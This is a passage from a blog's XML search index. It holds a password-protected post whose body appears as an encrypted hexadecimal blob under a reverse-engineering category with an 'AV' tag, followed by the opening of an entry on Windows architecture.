e8cea68f1e0f29bdc915f5034f86fb33aeb126c56377274690b47cdbe058475c818b08fce2d9c039dac1714b2391c7e60584d20955d01b26008102fae7affd3ef2341223a0d20a2ee7662e73afcf6a69a734435ab9650fe361c9d63f946df5dce7dd4f04985f45bba2c480a64ea4d5821b1648a6521bd9ea2e601e68d77aad4878bec32f55a76eb3b21d86ab8163f5e5c47fdc8aa41f071a49ba533756f311dbf253a809b0c453b037d31b16ea084ce1139bc882676320d65d106e9bcdb331da3c9c1d63b6f3c8a1fe996231dfed5db5edb0bd8dc4a2077f7542850ddf938b5324fc4ee4f3322a1561be3f71b3ccd28bbe9053c347a277e75912b821e751669959c97fdb930f9f5c11f0667ecf5ced673d46237e54a6f2532e3b5a348b4b8472bd300efb5cd807e1e41ec1540256dc66df8d08df831052c2aab240276e978aaf4d647680140a29aaa7d0ed153efd498719bc58a0662ec80a045c23220ec1ddc19a4010711fb74f7fdeae0bf3232432c3593016688cd7956081c8c017739cd5c9ee136d43bbd96c2b35408e1d7af033c0d2b95fe20239e6a87679a19811e320ccb3278203f1254f0c30384240263f30a67e3f129c7445b7a19f7ff64e54be6b7a1b8fa2e26821ac5acac39d463ae4d637194c5b3cdb9e0f04c7b10558772e2f673608952b5e86b4bccdcb9e65ba1a9c201bdee63562cf52d49b06d919c5d5a7ce560b6fc8fcf744ca28608309d538c1a0f9f501487986a0567e37af3125dc4781559d97e8389fb0f5b2d70050794e6ba6143bda2fcb155d35a33d00e83c9733d5e543962567a8afe4a7c514a3ff9dc8f15807c40e37d463510b8ce72920776ed7b84609398913651e45b05e240127a3cb4ddae85a0b69a41e2b8f7c7cc7a49181971212185fe0572e766653f6e19c3709c04dd6b3cf01bfecb008c4e9003ff5dadabd56227fb6c7ad45d05c92ce249518c7c8d7183ea0a04667f8d4c5d73ab1f07ac2fcb27456eaf8394576c38117c98d8cdeb72ae7c7b684587714486fd6d52a5488d9eb17274538919e2f54db963690d17aee28f53307005b1b690def08715edff99d71a5f3ec675e359d975bea2acf403c5b80020b341d9b71c00e028b17e1e23f8ec4f8e5f755250611c4c88d0d79f6ebd78f7b7f852fdd688dc882133ed559a6410466597dafc4c3fd3e43f832416784c130c668c07f00f74a58e841089b7350b46bffae2367dfe164b1b2cd4fa460d1999d178af28f0726fa320dc3907c99dddb7ef5a29efac260130e50831ce10091af6e5633a5de54f8b57004a61dfbf823656bcc0f33e9348a76f992bbcb108b25c487dd8bfbd6b00d6f7231bc776b009b33232942b5a50914d380bf50093089b098bc4ecb2f70288a0404df3b3012a18af03f39859494e6b298db65f1277a07087acfd1a52f0be426bb9c42dd5bdb32c3eeba7dc18f0932873c8b74b56a42cf2c4497d340a72e733d5b04e6e294526b7b1716a5562a0142a2b129bf5a903128b967a46b8037538fa6d336de4f0c8d7b38fe248f648ff969ef23d6174cbf7def8094be27b676bebff2dd8349b4a8fcb240f734c690078f5e707b0887c09df11bc18b35f82a293ff47d29054f75353ec7ff26efdd8e64d4d95d1a63a115ab1c610d2a595631da0a0c8b64965c25cf0c841786854ba93e2b8010ecddf31419270cee5368c412499d7a1da6a6583c142dcd54d1cf4d84d1224c51e5abedb9ff47e6b72c408f6714a8444baf6b1ab28af7b6292cb956b68aa1d8605d94ff8bb4494a2402b3e778b2aa951de79d933fb7de95adee93f0ae98132e8c4d5b4a1a4b5bc3a86756cad303a0cc9ff6b47f903eee3da86975d1c4879a5f6a820db81e8f9c44642b0ab6834869a20cccd8266b5036ccb7415515c0db920cff6cda3ba88510f933968be980c9a3b64686f5924ce63815461d59c7c9173760415d9845c122c9647677498e4c1bcc03f851ed91ff2157ab500a1c87cb582b7b9f65a0663b87cfc7fd5e4646ac47c6a7d305b2b28d976f6c96c0755368638a6562c34b487e6e392fd590d267ba4c14e7e37bb9d4e9c6547c858d53c0338bfbe2a573db75b9c65f9adbb525a18f8bfa4505d9cac0a6ba0a995ab4b989524c9d23cfa394dc84bd4f6fb7f6a4cccafb715e7e666852b4623678297f64817bf664c847f7b2f5e42a8c82a449e0f8d74e80ad2ecefd6631171aadcc17519bd42459a82d5856f8af1c8f9488088b9fb95ccc899b5de0f5b0a92636d79301e35a0af098b1e958ce6789a36926e5dd9da613f93ece80fcb9e8d778c1ce313fa2fe3cd5cfa97c0bb96fa3276068635cef282b2009f92eac806a23c0c25ce173f814166698050699c64fcab5d21ac573f2125c23c37f71f513819b5e7926fe3d7e54c81f892473a0261122a9ec7dd89b00c3592ead8907a687c385b9e0eeea4daac23d47ad42bfd47fece67d0bbe20edac65d69871c7c87cbc11ba22694b4d4e410cfeb2aafc799eda29cf8f6637c018a977b302d6eb84dd966176f75934690efa6b82c9d1d53b970529333907cebef3ee3329dc6880564923291c82c3dc88d88023eaa718a5b575624224c07fae7370c9d7003ac94d3f0a2f5330fcfdfc37ac93c83986cc07c193a46c801f33a7b8d283e11bf1a46fa88b720e7f9c21f621d12e4c13047dbdfaecba921c01a06fc441c33e9f24a861c47745f350014896460cb372895c15c6b9b25cec0234366ea18b8ea355b6adeb20705784130d5827bc1d7816e4044f4801535289737a973b7c3619562e30791de0d0f9514e85189c66ed92e11a66c94e67b0a03217c7a549fe3c1d6c4cbb8ff3bb2c84c39aec39e2c71092c97f78057411cce9bc61bafd774bd9573836082dcfca561115eb03f4829d052057ecfa670e2b3cd2b59d090a78c53f953207f4ffa51428bc1b8291cb51797266fb69dcbdc8dbc6d2a8c597b28ae0549f2ffbc8190704c0a2070d0e2a2fe929efcb320c049f84950f97f8519493d612f1ad6312ada7023d225ce645a2670cdd262bf5d31267350f1fd8c7ec383d4b32c931c70f0d5425f22f39fdad6707fee4df5f747b4e7c20f4238291f13a0199ef16cf51c01d8b608c663f703224b726cd5a43bc383bc8a382f457c9828391801d6b196f9a793a27d2f6b97573422c26155fe55969f25159f6c7dc1e18ed79d13c4ef7978d641dc25151aa177aa82900a960e3706ca15d3906d46ea1e2ba4b57cb995a1730674af36e77c22f17f2960277d10e47ed91951dcba30fe0f72d530969132450e4068cb3846fcb20792a3b4d70ed864453e4f1e825dd624a4c4996958311634cbe15baba7626ebbb9dab03fe652235c6aadee5bc0f5633b2871368d95f80dc6ad83306f055cc94ebfc05d86e591046288d1f927cbb375bea101a2084ef107845a427a87ec5577a14d59e0884bd8735fd9cf059dd0982f304b033d318c15db68c62745d3a323883a2aee951cae2affd6e00eba674aadc9d0722c7abcb7696afc81fbd450fa4cd6cfa30dd8391f1410da01ede20267155fd47aa175c2a1eb4125a1df0224316e9da178fe27dfcb4e1e0d92cc0ef3e10228d5ab5ecf2cb80696e8779b14b4d8691eec0212ddaccf073d20c9083ef3a036b44fd52c751e33fc138eaf329dbac58f3210d1af883c3fb71a38c3099e094a67c2b04da7225a635baf5e64a15f5b84f64e4e6b1e27d56e32c29f42a763ee78211c4476194956cc40f13721360121ce5fb1cd79e6c0f09f1306fb9b8f645df083063e3ad27f5484b077748a8cfdc4b7b93676043bac30db28d0393032da4be414ac78b3fbaae8cca635b6da078a8a2853a21d35065888e9e3c804e74d2ce05a5e34459511a280ab4a0de20fc446e43cc6c3ff461a8c35d5185510f63789a7e66ef1ee0885ebc5a67b77c2b3e130d77e245c9486380ae3d53ea12353ca2fab24ce52725661efae3ed08d7b57a6025b0c3068f6e612b7d35935e8798e6806893355504af8a312e9541ab147987d6c01b23ad9d6bc8a66a41690e652b8f2279520859108d4db1fe2c92f555592b70421feed90a92ccc031d1c95a7f0e25c53d932cf1ea4ffd88146422b6d17c2b60fcba59a790ea749c57ca4a8f28642c5042a24e23b29b23cbb993f8185ef7bc636b01ec763f65035ff6ad13899fd89d9364d095f6e3c2ebf44bba6291144d502a60898a6ef7af6cd2e35463a50266ba1fac346e3c51e9bee75ad033b62328d893dc78a798446276824a549a33f20d3f5a029f5dd176425e2197c21de40ff420c4cbd303f3b7c8c1d51d3ec4e9c54d0a684efb3964135146546bec65111842a5fa2e8f2ed6cdd213ec10a54cfc354de3bae0e0856c4b1a065e7548959aa8bff91d04b24427c1766d02d220827999a32f4b421c226621420b710b10ada7f0fa97455ace488cc3dd3cc4584ba1f2cbf19be0b72cefd49e448d55f28c3dcbba2b25d26aeca5048a927502fe92047e87897a5bb5b2a382ea58e7a1f9cfaa17102b54395006c18b619950b508552f89e75f5605981c72c0985f58b4e5a798ad0cea81058144748b083139108caaa8df98944ec12e81cff4175844d86122f1c3bb1affe74d723ae9be7256a9021170f9836acbbfdd225a531243fc050ca0bdf481953df24124916fc163047a37ae13fcebc804be4bea55c76ba9cb79ea44bd288e995769332fbe4d513ad9551465758095716ca64903a8bcb1ab4a5cd964bfda733e45d043a777f3dd5b9d88d1e5aed94d58722cdeb7e76c084b4a96327fd349b75c02b6838fd25b8722f0b804cc39c9138f1298dd0e0f64492325874248c367c6d990a8c6c2faaeae49dc63a0d3e4531831df2d26df05c370b4ad255113576c689e9fcac0dcc8c1f2d7d8e102321b68754ac18c699155cf4818581be643e34d62f7a25540f987511058a6e0c81eeb4367171f717cb0072fd2d79c8f3dbba490013c7cc2b19a56df0f2d412d26fc5e345a7d568bb65eb6b7b2575e7dfe52866648cbfd65ff0bb7b2f2cc55ab78c0e085a730f4e041264c635c922148535d38bf1effb7e22990878aecb25504cb99a8a9d3d16c3bce5d14470f5e1b3d57f19d9a288765bd2dad1693356aa435fd066595f8c36a7d401d27363af8a0e5527a731dd328d9bf2d2ded1c46e97f8b7153b8d7da0c8bd3e08aab704d53992706cee6686f5d6b77e0c7d4fc52837c1098288ecb5eaa0e8f3d0a5ff3b54ed0a5ca988968212c7a40d74b511f84e95da95568267b72feb5b99ad2f85e9fe81f59282b2cde1e6d25b59d32ddf3890984242f88cc05d78dccd56a161224d1f491977ccc512ddb7dd98397f6485007942c737bd6048e79329943b4e1070d023fdc91cb69d044604aca0fc1d55d8b4d471280fc85c3b3f76ca57f218dcab16eba753087ac9dc30e7d092e5827515ae674c970bd98a6c9b891d7581c5274f7679a8091e9646f8801fa2ffcb0880577a722ae0452060e02d17be61731be141816d3031c49d87199cdb5e83367e7d05e4d8870ee706aa225c88f2a7b5359e53fe97662f766569fb0b234fa95da0fe5b6217f48d26a21d23da5132efa0602f3bca32404906ee0cf24ced6a7ae01119c39e9a9bc33e4ef341cf3d889e4a8084a2506060b00561b8ad8bb34030a129ea98dc966d9cc9276c3b300d35b9811dc32d861729b4f59ea4787ab7fcae4eb52fc4b22193d0217a58748748c55193697fd1c7992716c58f2638c1a5853233e7687b86fdb709562c67b0805e667fb5f735f47c5b17c8fecd6208809d10a5844017debf1851258b1156bb029f90cad358cb259fd8c9d01910989f86519f21ef4fa6e2f57ffa9f6e199de9ef1126a25f795c3b54d5f420b7e08df80db4dcbdc7da10bb85b418528454ff8ab4adc49c75ec8a7a4235a1d52d08360e3625480e034c2a2fc3749de225d83920c26b1800c869d721fea007e8c90dee06e992a8e6ece7906e2ce8ddfce5a98bec7c6706f5792fe70bf90c59a6f1a46ba9e70fdc191017231acb85edada097b3640be60a13f49de2bf247c7b5b790921d9d690dc7d4eaa8f5e94eca2d5d82b95536e959bec7cde7f8f32b416255cc0ca58bb257811e0b1de912d5f58a61b91d3b469bab2a4ec9a6b6b246f5376c6eaf0090910f00e13ce6216947dc6c1d77cba864f3a327ce97103413f4e06768a2753f348fd6e0f2d4f9aa760df82691bb96ddedc782f50f3fdfd9b8315cad4c9520a4b1ea6024ed48931bce726af2a421e617252591d592d55a2c431d163e13d35ba85b66c684b416d447ef2ee73f6d3868c4ac02e287f4687d8f542bffb836354aab6b49a1971344348aab0581a2532257ef15ded0b5adbb123635cf0a704211fe1ff3309889c023e4ff3144b48490fc349d9edcc9f7eaed3984b35bb1eacf27dbb4f1f2563437db964dc98f920c77421a05740f4d0b8ddb6dcef7e6f19b92caa4b1f6ccbf9436f3da4a56f41c2e8debdd3b700f986c306cb1c5357cfa779b4c6c6d94165db0ef8b5ac39af7a9f406627913b4a5a55723e24603ef10f534502853910747d298c8ec058039aeebbdca7c46e214e423ae45968374f9bb73cb7086a9158f7540995d883883dabaf459b61512a1c9ebc4b717711af98a40469e3af67cb9caa1b7bd1ae31ebeb5e7c334eda6f6dd7da5e0af4ad8feccdfed1fc8e7197cb61ef32a56a7b37eb1666ff66c92ab4aefa9509971351e143e0a500102eb6f50cec78378763d80720432757e36d9dbd20183c43b507466d131f9043c5d3eda6d1846db8f8c55a833e1c7c2bdcd17c91da31b646b46acaed5bfc322dcbe3b75069e047bc0223bb9defcea431f89582b8674b2a2220446706861186df54f07d039a6b071b6d43727d6f51464f007e4eb66c1bf4e8cb5007fd19d9ceddde9a1796867fceeb17f7d3759eecc09be14406779700ae69c08c4692418dac199ac135f38cc9496ed1bc68dbcc15a5dea6fabcc9ff69c594c2a109f069b8b36349fa3b8e4a66717f841984198622fc9efeae608ad2c68fcb21c262418c52c5decb38dff775d73636b21e22bbde21852af2cd3a70dcaecbd59c0583c72e2d38904c16e87dd7056f33a8ab6fb0f79675df5ab23c07e910ece966d136892a7bda233356979cfb765bd844a959c2ee377e471c1524a713884d8396bfc43044a16a89c9e8697f62b5820e8a40fcc8406d92514596f88ae208844e4a94e2c8ab30488cdf0213817e81c10ee231782de7094258c0bb100f7f63ca12eb5b6b7c9e0613484392b6084d3c78c9ed406819e0ce1b92680d5d3de4f71a0ac5dca78f789142a5ff50deaa0079b0d92299280ab1bb954eeda51e398544a0ca015fa1e14f789e7333d5a354b50f436824c726fbcb3b9596ee6d0b58067e837ab169522745b3e60ea916ca5d8786a692dfd1e3e88fca6193cb21cfb266a766334754a628118fdedeb29d8f87486035e31a3c5f558ba04f73b49f4314891d2034f05563cfc084032fa6bbd66a57a8d808298e80ca4f77527962d0a72b257235449e37a1aa8ea83de868a2119d40c088b0f93979fca769233ede51e74c1efe32902a1d598a4e81b1bc3822090fd41414d2349228427c28d34bc7e418694f6f05fb933b952a829422e29ec0159894a0176aae16a1f89c4b8c48be0e821ffaed48c9d6bf4c38c5dc50c9b00514e8e9416760ac845c8d87287c98a74320aed396f7dd9c5fe162a21617d674c25a15942e9d3266d292516eb2d7ab3ae8ab0fea4027a39a3f3dc4d4f56d51861018d5dc6939d7e0f27e61af10695ecd797b3c02dbd5a4eeb79c72969a3ea458be272ec13198ff83046eeca6c6be071d4d9dcda458500122c5e7bcea003f8988b621b83ec9d79c3f072fd11b4987dd727fe0dcb81657af899029b01c321ee72dc0d0a722523723aac5861ce34a300dcd2f5bf0a27bed17ed774ee16954fa362c9b11b00560d945d760337276c7fd74054972b33d954d60c16802e221135926f0413ab2dd2ce604b457960bddc67abab2be450ee9906e8d67e46c56433d9af1d82822b4a1348cc3937b46ddfb759276e0152b825db18c399e68b568d2b41beb8fdf9b5c7725b4f6d853b7c08c857083190c90455f9dd42b12810704557056f134efc12a5bb7191f59a833d3e3678cda0c27f1762795cb7711f8a4caeb52eb2c9e5d43ab12b4ad7413a923156ceada6d215b57ddb5dfb41859e05dfb23ec0aac07b96bcce766a87a66b587de64845d89fc1c6d81172e81b722e3d2a460b5125382f9eeeb8d21c55f2bbef864928ebac07e9e2813135133ff80967a64df3227f680f8e028329e663b96eb0eb14e39b1d9bb5f17c3712d327d946c587b3802275cd39af5c9a30ea1edc34554562013db8266d3244a10051419981926c948d038efcba21512b4c4e4da43593a969d560bcb2caf0171a4a5a1d529f695b7926c0ae97829a6a9f692499da5a91e344222d3e5ac7ee32f1abae3d905e70307cbf8a474540b83c5ee0bacc05ba8a5b5573c44da53a1870c0772b029ef368135aa8ac1e45df3af1831e711c66d8f42489e7d2fe655726b6be132b7b87dd903e3a67f589e16e6a2634b77023608ce3acedcea0646667a1bb2d55efbef3f73a49264bc3e76e06039f89fae28b60110053ce91ad98ff1d0924fd5e1cffa79013ba6ded72b2202f7fcd2d69a7753df0380629ac378cc3eb4c3de1de7abd3e1f74d2b193b79b1cfa3bd0ebee8266e985e044fe4cc79bc3563fd9fb12aa35f02e6038e699bb5c557d21323f472d5e18eacc2308ca4138e3eaddf51a4fce9f1377f160fe5033c9dba3a080cb2430367b9f9b4d1ab25770d268155cef78e863b4afb6b63d41acdc9c45062536878637fcfacbd2fb1a38ab45c42ab5766e468213d7047b7b0c1630e83b8b8cc0065a18338e62008436c659f1d0724951838f41df63b0b04ba1fef62691bcb98311c08ab22cca579e1e4b1f6cb8028a9cd9c3e6518bf98ea75d05e9a88620cdaca9240cfaace992a352064aa4fbfdce0ee9796bcf8d5d7c93f749c8b6bdf83bfc6f8c3a2db1001e7d4703a22d487f0befc4c8175c4f5ad83b290b98d6f1de12d7c02595b2467733b1221741633d0ec2092a7bb7ab218e4a05fd69fb4972f6475f0d5a61de62e6e7f2c61edef653b77a26bd84b223d607fb96f137208835a1b7b5f879059116acf89b4ed6f1c98ff8c78f6fd8e907fdc99523f1229cf33107f931411dc4f2143ace7b2f2ef7de76711c89cdd5885a248dfe9b370015997e8ddfb811a3f42348d5538569eb760d2efd6a8ff7768421d7cf4a0db11dc35e0503bbcacd59e33170810854cd92231b0ea47bd91894a992f0ed46730266935045fe7f70c59601d597ed785c1922be83dc7c2649a67116a1084fc302799bd4611d0afa69fbfa903883b0707c0297163a4002402de2dc761cea873237ed885f7dea2598be04e23962753b6773b8bbd9e9f397b16e8cea7a75051b41df386dac30d88ce64cd7e8c539dbf75fdf5aa0a21b0f962b7cb2123103213ea9a7ff2860f70f863fec7dd47139f5124ae955be7144cbdefa962c0739ac5d174660440e9db9d99b67ebe876956a0fc8cf7f247f04e8673e835120e03a1cea30d5b5a3520b01dd9b8b8fdfc83177db436326f1b39e35929a0bbe44d5cc793c45cd92dec6447daa2fda0fbb5296bce3a6157362081341f5e4478be085b3fb4978a868d34d210af5e8cb21c98cd984a0826d4acc879306c19939b32779436ad96964ea0ca0517b0cef0ef7d288daf9ae6b80047ac2056b42fd2e487ea5336374ec217f1e382bbff20aca3171b984ddc34f87fbcc9f8c6bae5dfe0425138d612e4ab4db6952e3a9961ace41f80fcdc3c8aced5172006b80cb3e9dc16d70e6cbdda46d9298f6665a258934ee43ed13516b0ae295e172cf52e1b5163d2e7cc856bbf019b87b8603f5d913f886d74f883895c40a0fa876b5083ec9d49a20cad1c37a645dc3e0333a9d1b3898e1fc968ff8f10842f13cb93285839d5868f2d4e8ae7b1590c60a31885cae3c1c82094a9e00d1213a5af601a5b1a0c5b5049acb345de62217b2ada987177b37b1616b4d505c30bb4d66f2a8f67156431e977f43783724106aad0695577c46d314883f669f166063d0319c31742b7a204f11b51e7e4a3c2e89ff8a1700210e95975868cfdc6306b31edd6fe7f45c889fba46d2ea0060a1933386828fc3d4ce0379299b9a9df3321754c3b090d280533b6910f7c03bf6472a1ade85d3634f5f3f763f67e288d8ef450deb6c70ca5fd033f6c080f7233a6db00ce6e1890f14774e36be264c69d18061fd25b9565e20311489a9e5e426a280efc2942e5e2e5a7d18e146b9cb9077041dfd141a3da38fc9f70940cfe02cfe29334357753c491a310267d90bacd5967feec94a5ef90f2e62cc99952fa1b3e00ace7f9330efc9a071752eb6e4b962b2a5c54fa8eff6ce45fbd92dcd54e22c9ffaf73c5a19e3e167bf2e970f6fd5392a563dbf5217259c65fcbe35f0e3442d1e5f07bdb6aaebd11ddb1b4d9dab3d57ddc4c5712a79d891e9a544c8e3a6dcdae39e1e65b3bc02d93b4a6b19d015695aa38484ca791e2ad279c56bf74893fa69b9daa2c0aea00e10c95bb0aaf08326a1f84c0e6c00ea18b7197f38120284ea7202728eae0f4417350b87cd3bfd7923600a6da8fe1bffaf40f8ed26e6910b178b9828c3c11d3db482c69dd7bac67387ad9d9791aa7342161d4e284c694946f47e211d93f9e4820b32b987a2b0693ce7da35a6e3eb65b98c19e74a9fc394d82ded602d9fc3ad8793da6f68c38aafe689a68a2e1c9e14c96d597c9c1022dfccdac4b46112c410fee6cda806ece71c8224a809e07e7d086ee0bf7c78e04a27538a4ab88cb7666fca1c5f3f385a707536f9db531492800b79d6760791656306f36b87bcb508d4b7babaadd93ab2877fec5ab1d63936a3d73276bec8ab1bc9e37c5bb8cfd52e650d7639066c6d4b6641b4a8ff6f73ab10cd092a922501f49e5adeaddec44639fd1935b8ca1a1f083d95cd333c1adcf0c8b9c81ae32ff5cebd2780f993ac53c09e8a3f4f3fc367359c4ec00bf6e55988cbf2b111eb30fa7ec6a3baa2a9c681ea77b03d260c1c357cb2e79118ac2e5fd58b7de0e798d0bf67055d4c8a9f07671b8545aab652cfd65fe99ef3d7a41620ef581471645778975f478177f2bf85dddaf4dfe8247c9834866a4dd3c8a0bc26e147a73369ab9a13c6dca15c040276aa4adaab47225f67940252121dfdce23e575daa5c006dcef16560361ca27eb5b74ae6a547376c73a50834fd7c58b6e2f56f6efd967cae0ff859afd2f0b237e44816ccc026853308d1f8774770ee80cb415fd81e7d3b12683429e03169b9f5fb4a3bced85155ac808a2fd8541402c80c63fd7e03ca8248d7a12b5545db6d6c20d9e780b13c8207be4343216613cc47bd9e49ac8c294d0845b053a167961727f178e29867c00978f1ecd43f1c590ab9ca39194ad04487500ba67407fb36159e0de66d252aa0fe11f8831f1a8a5921bc6087a30ef0cd215c28b3feb75a111f97c9606cc21227ebcd75b47037dba87efb31438bb8836143e945976aff823834bd8cd34e35fa3384f3b6700a0acb83b1f2081e14554a909be29c3669f907eade483197f467eda556201ee574c6b4f10c22986499918dfba38faeb4150d845cfac7a60de1a733a7a3516be9abedfc60c3a49128cb0053dcbd0faa1a7b8ed0fbedca841df14207cfb0ee092009d8161dae44824765d0f7f47615f5d02e11af329b501fa3308564093df7108e28efdcfdc8fb0fdc33c3ee28f4ee7476edf98bcad9e97890329f1949abfc7daf29c23a4cacbaaa6ed4b9740423f62b64962539043f6d13dc3134d42088330205156748e941ad5bf2f6d82d2a4fd3c9ea398248074b94b013a30243caae2c51362acc048f9e38e1dc7d398f0409576fec4e3951be8bb025abe6dae47d87427e23364c98e6435a8943c3ddd5c94a5b1946c9023e8feebb133adfd3af138256602dc5f0809ab1cba3a7594106e9137ffe1bcee0b0f21893a7995dce1736c659da587aa49e44dd5fa2bdb8f48e64ce8903b42a2590759a6757358d2cc23ea6e5fd47781caebeb75af1e0b83cb6bcbb6844ea8978460fbc5e54e89352273906907219515520045238ebf5b5ef20fe291c63ae24584d9bdf12eff53d1a74263460858a03b01b36036fc226ecf1cfb26f936c2d6b06e6e36a486c014cd75dc2b8647d3806ca596fc9083dcb25093ad2e83d9aa7177432ac8ee2a58b0ccce806783b0db5febd60fe1c025cbe4e36c2251b3e12770c25953d89214ce50586b96da80e73d3cf8ee5a58a631134463bf86843e9a3fa84392237be4a219a3b3ebc25f88ceb06da5296eadfac501adb6eb01b03ecf59295fcbb5d57b7a1bdab24b1dbca93c8a523091ad2f156bac090a35b49c63cc7158f0b1ea7c9cc683681df322faa44b0c067ce2e8082fdcc1c8980c04b87bb2d8db9d5a9372333561e645c282a9f1948bdadf8f1f79457c75696d97e56e80b834a4764feb7dca84effcd4f36a99e9bc7563b7f62f792319db29618a2e1fb3c400faa6205694d65eab2ef7510913c4ba004b2a825e6df9470cabaea4135f6f57151a7bbe19d4c1a752a921f833948a11d0397ccf05ffeae31e6e47e5754cb3b13b0f2f2b6f30a416211362307a4f226e75434aad623abc4cf71061d193d1527c4aece46fff5edb06873a5c10a0f1adaf1c577e7b05ded5354ad79ff14dd95fa457e34763fa5e7edc1f9a0deb141015e4b31f2af171fb48b37dee46bc03a79ba8c24bd1362c8c902f9ec0b0ab9a52018e2b3996b7e0c0c81c627bf0e43ae27c606296f23e7580747bf9cfc18c4df29d250f5ed67cd5ba617da0ee59a9140410ab41d3f6f49e61cc68d69d52946aa5d89619ff7383617d203e9110516389069a7cf80c07d0806d97691021f1e81f4e7e89f365292e1b1d83ced111a822e048f374ddbe3eae92d1ee6328568deb9e186c2d9ee5c33fd29a2bf4c67e02e717a387236996345e2974bb3012eccd40c3cf773e69cfbce49dc4e0a3a2bfc7adb00e60ee6d023aaad882e03059d8d36d7d1e8d779f1655cf7cc9ac7a222fceb974d3a25c5e47803642e7f7637a09abaa46a26fac415744f276ce5ccbb823b19fe80ad4b2f898398ec8f2b2926563f59fdccd8bc9e37260f42315ce7721cac12f3000d0a85dd561161c32d7a4b8931f75174bae81ccfa3a13d9473fc4d3ab46d912f07d51d38ec61fa1ea822c9789ba385bfcd52b0d6f907e3f3948b2d9cdd51503d55e7692216ee1e2efa7d5ddd33142a957cb1f4bb02a71eca45a78e1f0cdcfb946d2a47c1aa63f4d705a8278a0612370ecdca14a4c586d26a340b4621966120b09eafd7494dab650423cd29b37304962971baac347ea6217ab95e4a6898539cedbcdf32f6595ce76612be0ae4de9a34bdfa887ad9fb7c2e353fd29fd6cdc918c2e93e17bbd45370f126dd1f81c74183e88aa6a737c8200e8dbccc4a04e4c3df00cd56c072862dba61d4e913abf128bb47e383eb70300574ac404b967bc682ff542276e923e30a739d612c7c3cc8e3e65ed6ec80a7e5307416e423a4396d7403dbb237638e623d67370b0ac9859df36c1273505f5a83b90b18d535a7c3f67b23d58e929ed37f9cd5e23080697a13fa8844b82d9ec5f3edc5d6cbd67289d65e1fc2aca56458005ac1c77989f634fc053efc3943dc7138ea5058f69c2cef3c384ef152fa139b97d35fb0a2368a8143360637a2517a19337d373de95bfecda768cf7584d8cccffcade0736e07d95ce21ce93db25cacd697865e56e9f3bc3e1eea0f614c57185bc61c87e6628c6f1edbf3c17876b1ccd0e0368128f28e3b95460e89f0a76afd2b24cb18f4d87993cf6fbeed10070a39046c6d6eff51e019ff4aa068283b5be9f3256f64c2f6e056986368001f6588344fd1625e02674943941eafe044f85d1eab9aa226089c957b72b150a7f883713f8427385a9e0a445fc453f1f9e74a84083ca3aa4aa060b1ed94a9f522b6c505c98e997eb8c793c0b4fbb7cca43eeba4dd863bf6e5fe4e6e944ed992e386722bd6b7a136a0d44a61d3443c2814ab503e2692ef7484e543bbd0606cd5cbb99c25d34f1815f9c26f989f24a943b62c98a4a92fcd890a9e3080cdaa83e7d76f1916034314af4172397982de89d29145461e32cb7d0cc983c9efa2d2cc24e834e6db6669e3f61828e7e611bbf63e240e15e3f79d126fc6a2f37f3fa2e2c17284edd6a42c647ec4bae28d01a3c0ab7708ea4e95e285e7284727f92c503bfaa5980875a79d18df20ca9dda536c56d6a32ff98c0b44ebdceb704e9509cfef3a6a01a1f54b2cdb0487df7606d1fed9f1b549ca7e0b43d374475fb98c5288e2b2ed1da335c02eb81f16d2d6d2a14ce5699d6f6c2e47aab564327c7ed131a163c22d38d914fc3b6a7e8edca54e1c160a60463f8f908a0263206420b83c79265eab9c821c4332f1ee5ef8470443a26dc1a3bded38e9fe28592b80146e3784053cc2356bed5dc7ba5bbb1f4d5b2c473ad21c11272422c4afc7e8da9a16d45a9af9812e9e358e5714128aee20b7fff291dd797c37c5dd037e64babd0c69feba4302f2d95b60fee3f4045361ce4dba973b51b193d34a80c69b7d555b1a417edb23d32f6448542b008fe25667728b534ff95429c3006eee4dcfd8a4cd8367071a503c702f1359712138c43d824d04b38eddbaa6742333c1bfa8d81b0aff93e445a6dd6d4005ebc145e3ae779fd3d85dec7ae472fe42fe470e24eec1971c2c8ffcfe64f4350c5705055cfd055d03e093de7435a24ed9c54ed99179496f56db2f17ee0d266dd051dab0048357727a07dbffefd4ba07f597173f80d17dad18711f74431c7276f2fb3786ae4098e623b9222e15aa828775fac1b0e3174c957ad561ae2930cdb5568e11b413e815cc52592c11a7462d56e885b465be19165478006e24208d7fc499489d9c3f9d91cffd83a1c96cd4e94d49f3a26b07861a5ad5ffd0dda21c9188b21c814108806eafe7ddacd1e049bd29d80e02e2fe15da4e840f91e98a37a1ce77e0f9cf5d217bbe59faafc0a82647db9005bd8aa81bd6252150427ff954b4b069003044053fddf716d8e9f5da62bdb322dd0524d6440b5779ff10193ea6c0e8ef96940510d1ab9e590e49d67f082568a111b0ff27b7bf89ff711f3dd87c10c0b035d10c91e7b098a9daa52a07869ca57299c151eab233b767a1299f95385a7c14f7e7ba627a9841e8253c744c826d79bd29f612d7cca33dbff2636476d6f61930133c5f1d3185a515a95961b261db32c330173c82c122ce5ef7d37e65416b9f51c8a8d4976a21d3d7d4b887957d9c67045edc9e69a704de55b657c27ca4f3a2e7bc5d6089ab4d2030bdd9ec7b0637fc3a2031a396ca5bdc439f2c0c7e183707bffc6271b121c7974efe16f1595010003b9f3d5bff2bda2b374c98f0acc5b16fb4ce29e3d56f69dbcd731fd4de2d2e6ba7b5bf3652e2eacedd12888647c09b230b18b9459ff9b2f2c9706eecb0c3e78a1bfa7ba530c4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.Windows Architecture Windows架构</title>
      <link href="/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/"/>
      <url>/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/</url>
      
